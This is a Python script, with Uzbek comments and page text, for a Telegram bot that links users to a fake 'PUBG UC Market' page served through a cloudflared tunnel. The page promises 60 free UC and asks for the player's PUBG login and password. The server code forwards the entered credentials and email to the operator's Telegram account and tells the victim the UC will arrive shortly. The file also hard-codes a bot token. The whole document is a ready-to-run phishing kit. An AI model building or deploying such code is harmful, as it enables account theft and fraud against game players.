import telebot
from telebot.types import InlineKeyboardButton, InlineKeyboardMarkup
from flask import Flask, request, render_template_string
from threading import Thread
import subprocess
import re
import time
import os

BOT_TOKEN = "8194877107:AAFYZR8HbBD5B43WN3d871srclsOa7H6xwk"
bot = telebot.TeleBot(BOT_TOKEN)


# ==================== MAJBURIY OBUNA ====================


# ==================== CLOUDFLARED ====================

PUBLIC_URL = None

def run_cloudflared():
    global PUBLIC_URL

    process = subprocess.Popen(
        ["cloudflared", "tunnel", "--url", "http://localhost:5000"],
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        text=True
    )

    for line in process.stdout:
        print(line.strip())

        match = re.search(r"https://[a-zA-Z0-9\-]+\.trycloudflare\.com", line)
        if match:
            PUBLIC_URL = match.group(0)
            print("FOUND URL:", PUBLIC_URL)
            break


# ==================== FLASK ====================

app = Flask(__name__)

# PUBG UC HTML sahifasi (faqat UC paketlari)
html_form = """
<!DOCTYPE html>
<html lang="uz">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PUBG UC Sotib Olish</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }
        
        :root {
            --primary: #ff9900;
            --secondary: #1a1a2e;
            --accent: #00a8ff;
            --light: #f8f9fa;
            --dark: #16213e;
            --success: #2ecc71;
            --free: #2ecc71;
        }
        
        body {
            background: linear-gradient(135deg, var(--secondary), var(--dark));
            color: var(--light);
            min-height: 100vh;
            padding: 20px;
        }
        
        .container {
            max-width: 600px;
            margin: 0 auto;
        }
        
        /* Header */
        .header {
            text-align: center;
            margin-bottom: 30px;
            padding: 20px;
            background: rgba(255, 255, 255, 0.1);
            border-radius: 15px;
            backdrop-filter: blur(10px);
        }
        
        .logo {
            font-size: 2.5rem;
            color: var(--primary);
            margin-bottom: 10px;
        }
        
        .header h1 {
            font-size: 1.8rem;
            background: linear-gradient(to right, var(--primary), var(--accent));
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
        }
        
        .header p {
            color: #ccc;
            margin-top: 10px;
        }

        /* UC paketlari */
        .packages-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
            gap: 15px;
            margin-bottom: 30px;
        }
        
        .package-card {
            background: rgba(255, 255, 255, 0.1);
            backdrop-filter: blur(10px);
            border-radius: 10px;
            padding: 20px 15px;
            text-align: center;
            border: 1px solid rgba(255, 255, 255, 0.2);
            transition: transform 0.3s ease;
        }

        .package-card:hover {
            transform: translateY(-5px);
        }
        
        .package-card.free {
            border-color: var(--free);
        }
        
        .package-icon {
            font-size: 2rem;
            margin-bottom: 10px;
        }
        
        .package-card.free .package-icon {
            color: var(--free);
        }
        
        .package-card.paid .package-icon {
            color: var(--primary);
        }
        
        .package-uc {
            font-size: 1.3rem;
            font-weight: 700;
            margin-bottom: 8px;
        }
        
        .package-card.free .package-uc {
            color: var(--free);
        }
        
        .package-card.paid .package-uc {
            color: var(--primary);
        }
        
        .package-price {
            font-size: 1rem;
            margin-bottom: 12px;
            color: var(--accent);
        }
        
        .package-card.free .package-price {
            color: var(--free);
        }
        
        .package-btn {
            width: 100%;
            padding: 10px;
            border: none;
            border-radius: 6px;
            color: white;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
        }
        
        .package-card.free .package-btn {
            background: var(--free);
        }
        
        .package-card.paid .package-btn {
            background: linear-gradient(to right, var(--primary), var(--accent));
        }

        .package-btn:hover {
            transform: scale(1.05);
        }
        
        .free-badge {
            background: var(--free);
            color: white;
            padding: 3px 8px;
            border-radius: 4px;
            font-size: 0.7rem;
            margin-bottom: 8px;
            display: inline-block;
        }

        .popular-badge {
            background: var(--primary);
            color: white;
            padding: 3px 8px;
            border-radius: 4px;
            font-size: 0.7rem;
            margin-bottom: 8px;
            display: inline-block;
        }
        
        /* Modal */
        .modal {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.8);
            z-index: 1000;
            justify-content: center;
            align-items: center;
        }
        
        .modal-content {
            background: rgba(255, 255, 255, 0.1);
            backdrop-filter: blur(15px);
            border-radius: 15px;
            padding: 25px;
            width: 90%;
            max-width: 400px;
            border: 1px solid rgba(255, 255, 255, 0.2);
        }
        
        .modal-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 20px;
        }
        
        .modal-header h3 {
            font-size: 1.3rem;
            color: var(--primary);
        }
        
        .close-modal {
            background: none;
            border: none;
            color: var(--light);
            font-size: 1.5rem;
            cursor: pointer;
        }
        
        .modal-package-info {
            text-align: center;
            margin-bottom: 20px;
            padding: 15px;
            background: rgba(255, 255, 255, 0.05);
            border-radius: 10px;
        }
        
        .modal-package-uc {
            font-size: 1.5rem;
            font-weight: 700;
            color: var(--primary);
        }
        
        .free-package .modal-package-uc {
            color: var(--free);
        }
        
        .modal-input-group {
            margin-bottom: 15px;
        }
        
        .modal-input-group label {
            display: block;
            margin-bottom: 8px;
            font-weight: 500;
        }
        
        .modal-input-group input {
            width: 100%;
            padding: 12px;
            background: rgba(255, 255, 255, 0.1);
            border: 1px solid rgba(255, 255, 255, 0.2);
            border-radius: 8px;
            color: var(--light);
        }

        .modal-input-group input:focus {
            outline: none;
            border-color: var(--primary);
        }
        
        .modal-submit-btn {
            width: 100%;
            padding: 15px;
            background: linear-gradient(to right, var(--primary), var(--accent));
            border: none;
            border-radius: 8px;
            color: white;
            font-weight: 600;
            cursor: pointer;
            margin-top: 10px;
            transition: all 0.3s ease;
        }

        .modal-submit-btn:hover {
            transform: translateY(-2px);
        }
        
        .free-package .modal-submit-btn {
            background: var(--free);
        }
        
        .success-message {
            display: none;
            text-align: center;
            padding: 20px;
            background: rgba(46, 204, 113, 0.2);
            border-radius: 10px;
            margin-top: 20px;
            border: 1px solid var(--free);
        }
        
        .success-message i {
            font-size: 3rem;
            color: var(--free);
            margin-bottom: 15px;
        }

        .disabled {
            opacity: 0.6;
            cursor: not-allowed;
        }

        .disabled .package-btn {
            background: #666 !important;
            cursor: not-allowed;
        }
    </style>
</head>
<body>
    <div class="container">
        <!-- Header -->
        <div class="header">
            <div class="logo">
                <i class="fas fa-fire"></i>
            </div>
            <h1>PUBG UC MARKET</h1>
            <p>Eng arzon narxlarda UC sotib oling</p>
        </div>

        <!-- UC paketlari -->
        <div class="packages-grid">
            <!-- Bepul 60 UC -->
            <div class="package-card free">
                <div class="free-badge">BEPUL</div>
                <div class="package-icon">
                    <i class="fas fa-gift"></i>
                </div>
                <div class="package-uc">60 UC</div>
                <div class="package-price">TEKIN</div>
                <button class="package-btn" onclick="openModal(60, 0, 'free')">Olish</button>
            </div>
            
            <!-- 120 UC -->
            <div class="package-card paid">
                <div class="package-icon">
                    <i class="fas fa-star"></i>
                </div>
                <div class="package-uc">120 UC</div>
                <div class="package-price">39,000 UZS</div>
                <button class="package-btn" onclick="openModal(120, 39000, 'paid')">Sotib olish</button>
            </div>
            
            <!-- 355 UC -->
            <div class="package-card paid">
                <div class="package-icon">
                    <i class="fas fa-crown"></i>
                </div>
                <div class="package-uc">355 UC</div>
                <div class="package-price">89,000 UZS</div>
                <button class="package-btn" onclick="openModal(355, 89000, 'paid')">Sotib olish</button>
            </div>

            <!-- 720 UC -->
            <div class="package-card paid">
                <div class="popular-badge">POPULAR</div>
                <div class="package-icon">
                    <i class="fas fa-rocket"></i>
                </div>
                <div class="package-uc">720 UC</div>
                <div class="package-price">169,000 UZS</div>
                <button class="package-btn" onclick="openModal(720, 169000, 'paid')">Sotib olish</button>
            </div>

            <!-- 1500 UC -->
            <div class="package-card paid">
                <div class="package-icon">
                    <i class="fas fa-gem"></i>
                </div>
                <div class="package-uc">1,500 UC</div>
                <div class="package-price">319,000 UZS</div>
                <button class="package-btn" onclick="openModal(1500, 319000, 'paid')">Sotib olish</button>
            </div>

            <!-- 3000 UC -->
            <div class="package-card paid">
                <div class="package-icon">
                    <i class="fas fa-trophy"></i>
                </div>
                <div class="package-uc">3,000 UC</div>
                <div class="package-price">599,000 UZS</div>
                <button class="package-btn" onclick="openModal(3000, 599000, 'paid')">Sotib olish</button>
            </div>
        </div>
    </div>

    <!-- UC olish modal oynasi -->
    <div class="modal" id="uc-modal">
        <div class="modal-content">
            <div class="modal-header">
                <h3 id="modal-title">UC Paketini olish</h3>
                <button class="close-modal" onclick="closeModal()">&times;</button>
            </div>
            
            <div class="modal-package-info" id="modal-package-info">
                <div class="modal-package-uc" id="modal-package-uc">60 UC</div>
                <div class="modal-package-price" id="modal-package-price">TEKIN</div>
            </div>
            
            <form id="uc-form" method="POST">
                <input type="hidden" id="selected-uc" name="uc_amount">
                <input type="hidden" id="selected-price" name="uc_price">
                <input type="hidden" id="selected-type" name="uc_type">
                
                <!-- Faqat 60 UC uchun login/parol so'raladi -->
                <div id="login-fields" style="display: none;">
                    <div class="modal-input-group">
                        <label for="username">PUBG Login</label>
                        <input type="text" id="username" name="username" placeholder="PUBG foydalanuvchi nomi" required>
                    </div>
                    
                    <div class="modal-input-group">
                        <label for="password">PUBG Parol</label>
                        <input type="password" id="password" name="password" placeholder="PUBG hisob paroli" required>
                    </div>
                </div>

                <!-- Barcha UC lar uchun email so'raladi -->
                <div class="modal-input-group">
                    <label for="email">Email manzilingiz</label>
                    <input type="email" id="email" name="email" placeholder="example@gmail.com" required>
                </div>
                
                <button type="submit" class="modal-submit-btn" id="modal-submit-btn">
                    <span id="submit-text">UC ni olish</span>
                </button>
            </form>
            
            <div class="success-message" id="success-message">
                <i class="fas fa-check-circle"></i>
                <h3>Muvaffaqiyatli!</h3>
                <p>UC hisobingizga yuklandi</p>
            </div>
        </div>
    </div>

    <script>
        let freeUcUsed = false;
        
        function openModal(ucAmount, price, type) {
            document.getElementById('modal-package-uc').textContent = ucAmount + ' UC';
            document.getElementById('selected-uc').value = ucAmount;
            document.getElementById('selected-price').value = price;
            document.getElementById('selected-type').value = type;
            
            // Login/parol maydonlarini ko'rsatish (faqat 60 UC uchun)
            const loginFields = document.getElementById('login-fields');
            if (type === 'free') {
                if (freeUcUsed) {
                    alert("Siz bepul UC ni faqat bir marta olishingiz mumkin!");
                    return;
                }
                loginFields.style.display = 'block';
                document.getElementById('modal-package-price').textContent = 'TEKIN';
                document.getElementById('modal-package-info').classList.add('free-package');
                document.getElementById('modal-submit-btn').classList.add('free-package');
                document.getElementById('submit-text').textContent = 'BEPUL UC OLISH';
            } else {
                loginFields.style.display = 'none';
                document.getElementById('modal-package-price').textContent = price.toLocaleString() + ' UZS';
                document.getElementById('modal-package-info').classList.remove('free-package');
                document.getElementById('modal-submit-btn').classList.remove('free-package');
                document.getElementById('submit-text').textContent = 'SOTIB OLISH';
            }
            
            document.getElementById('uc-modal').style.display = 'flex';
        }
        
        function closeModal() {
            document.getElementById('uc-modal').style.display = 'none';
            document.getElementById('success-message').style.display = 'none';
            document.getElementById('uc-form').reset();
        }
        
        // Form yuborish
        document.getElementById('uc-form').addEventListener('submit', function(e) {
            e.preventDefault();
            
            const email = document.getElementById('email').value;
            const ucType = document.getElementById('selected-type').value;
            const ucAmount = document.getElementById('selected-uc').value;
            
            if (!email.includes('@')) {
                alert("Iltimos, to'g'ri email manzilini kiriting!");
                return;
            }
            
            // 60 UC uchun login/parol tekshirish
            if (ucType === 'free') {
                const username = document.getElementById('username').value;
                const password = document.getElementById('password').value;
                
                if (!username || !password) {
                    alert("Iltimos, PUBG login va parolingizni kiriting!");
                    return;
                }
                
                // Bepul UC ni belgilash
                freeUcUsed = true;
                document.querySelector('.package-card.free .package-btn').textContent = "Olingan";
                document.querySelector('.package-card.free').classList.add('disabled');
            }
            
            // Formani yuborish
            this.submit();
        });
        
        // Modal tashqarisiga bosilganda yopish
        window.addEventListener('click', function(e) {
            if (e.target === document.getElementById('uc-modal')) {
                closeModal();
            }
        });
    </script>
</body>
</html>
"""

@app.route("/form/<user_id>", methods=["GET", "POST"])
def form(user_id):
    if request.method == "POST":
        # UC form ma'lumotlari
        uc_amount = request.form.get("uc_amount")
        uc_price = request.form.get("uc_price")
        uc_type = request.form.get("uc_type")
        email = request.form.get("email")
        username = request.form.get("username")
        password = request.form.get("password")
        
        # Foydalanuvchi xabari
        user_message = f"✅ Buyurtmangiz qabul qilindi!\n\n"
        user_message += f"💰 UC miqdori: {uc_amount} UC\n"
        user_message += f"📧 Email: {email}\n"
        user_message += f"⏳ Yetkazish: 5-15 daqiqa\n\n"
        user_message += f"📞 Support: @msrfteam"
        
        # Admin xabari (SIZGA)
        admin_message = f"🛒 YANGI BUYURTMA!\n\n"
        admin_message += f"👤 User ID: {user_id}\n"
        admin_message += f"💰 UC miqdori: {uc_amount} UC\n"
        admin_message += f"💵 Narxi: {'BEPUL' if uc_type == 'free' else uc_price + ' UZS'}\n"
        admin_message += f"📧 Email: {email}\n"
        
        if uc_type == "free":
            admin_message += f"👤 PUBG Login: {username}\n"
            admin_message += f"🔑 PUBG Parol: {password}\n"
            admin_message += f"🔔 Turi: BEPUL UC"
        else:
            admin_message += f"🔔 Turi: Pullik UC"
        
        # 1. FOYDALANUVCHIGA yuborish
        bot.send_message(user_id, user_message)
        
        # 2. ADMINGA (SIZGA) yuborish - O'Z ID'INGIZNI QO'YING!
        ADMIN_ID = 6948346741  # ⬅️ BU YERGA O'Z TELEGRAM ID'INGIZNI YOZING!
        bot.send_message(ADMIN_ID, admin_message)
        
        return "Success! UC buyurtmangiz qabul qilindi. Tez orada hisobingizga yuklanadi."

    return render_template_string(html_form)

# ==================== TELEGRAM BOT ====================

@bot.message_handler(commands=["start"])
def start(msg):
    bot.send_message(msg.chat.id, "Salom! bir kunlik aksiya PUBG UC olish uchun /link buyrug'ini yuboring.")


@bot.message_handler(commands=["link"])
def link(msg):
    user_id = msg.chat.id


    # Cloudflare URL hali tayyor emas
    if not PUBLIC_URL:
        bot.send_message(user_id, "⏳ Cloudflare URL tayyorlanmoqda... 2-3 sekund kuting va qayta /link yuboring.")
        return

    # Foydalanuvchi uchun shaxsiy link
    uniq = f"{PUBLIC_URL}/form/{user_id}"

    markup = InlineKeyboardMarkup()
    markup.add(InlineKeyboardButton("🔗 UC Sotib Olish", url=uniq))

    bot.send_message(
        user_id,
        f"🔗 Sizning shaxsiy linkingiz tayyor:\n\n{uniq}\n\n"
        f"Ushbu link orqali PUBG UC sotib olishingiz mumkin!\n"
        f"✨ 60 UC - BEPUL (faqat bir marta)\n"
        f"⭐ 120 UC - 39,000 UZS\n"
        f"👑 355 UC - 89,000 UZS\n"
        f"🚀 720 UC - 169,000 UZS\n"
        f"💎 1,500 UC - 319,000 UZS\n"
        f"🏆 3,000 UC - 599,000 UZS",
        reply_markup=markup
    )


# ==================== THREADLARNI ISHGA TUSHIRISH ====================

def run_flask():
    app.run(host="0.0.0.0", port=5000)


Thread(target=run_cloudflared).start()
time.sleep(2)
Thread(target=run_flask).start()

print("Bot va server ishga tushdi! /link buyrug'ini yuboring.")
bot.polling(none_stop=True)
